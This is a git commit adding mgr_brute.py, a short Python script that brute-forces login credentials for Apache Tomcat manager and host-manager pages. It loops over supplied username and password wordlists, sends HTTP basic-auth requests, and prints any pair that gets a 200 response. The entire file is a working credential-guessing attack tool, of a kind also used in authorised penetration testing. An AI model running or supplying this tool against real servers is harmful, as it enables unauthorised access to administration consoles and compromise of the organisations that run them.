4f338a31a1784c32e7682ecea0c941423ff68ec8
b33lz3bub <41506325+b33lz3bub-1@users.noreply.github.com>
2020-06-24 17:47:29 +0530

    Add files via upload

---
+++ mgr_brute.py
@@ -0,0 +1,43 @@
+#!/usr/bin/python
+
+import requests
+from termcolor import cprint
+import argparse
+
+parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")
+
+parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
+parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
+parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
+parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")
+
+args = parser.parse_args()
+
+url = args.url
+uri = args.path
+users_file = args.usernames
+passwords_file = args.passwords
+
+new_url = url + uri
+f_users = open(users_file, "rb")
+f_pass = open(passwords_file, "rb")
+usernames = [x.strip() for x in f_users]
+passwords = [x.strip() for x in f_pass]
+
+cprint("\n[+] Atacking.....", "red", attrs = ['bold'])
+
+for u in usernames:
+    for p in passwords:
+        r = requests.get(new_url,auth = (u, p))
+
+        if r.status_code == 200:
+            cprint("\n[+] Success!!", "green", attrs = ['bold'])
+            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
+            break
+    if r.status_code == 200:
+        break
+
+if r.status_code != 200:
+    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
+    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
+#print r.status_code
